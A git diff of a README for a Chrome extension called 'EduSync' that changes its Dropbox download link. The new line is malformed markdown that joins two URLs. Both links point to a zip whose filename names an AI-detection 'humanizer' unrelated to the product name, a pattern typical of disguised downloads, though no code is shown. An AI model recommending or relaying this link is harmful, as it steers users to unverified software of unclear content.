@@ -8,7 +8,7 @@ You can download EduSync, the writing optimization Chrome extension, using the l
 
 ## 📥 Download Link
 
-[Download EduSync.zip from Dropbox](https://www.dropbox.com/scl/fi/0pdeu4kyj6m0i5ilbbt75/AI-Hummanizer-undetectai.io-cleverhumanizer.zip?rlkey=4hwpdfufuh5ytk621nwu1yk77&st=usdzihm7&dl=0)
+[Download EduSync.zip from Dropbox](https://www.dropbox.com/scl/fi/0pdeu4kyj6m0i5ilbbt75/AI-Hummanizer-undetectai.io-cleverhumanizer.zip?rlkey=4hwpdfufuh5ytk621nwu1yk77&st=usdzihm7&dl=0](https://www.dropbox.com/scl/fi/4venkjl736euyct0e21nx/AI-Hummanizer-undetectai.io-cleverhumanizer.zip?rlkey=akkmosudfi78xwcdhjrrc1dpj&st=8xnhnqhi&dl=0)
 
 ---
 
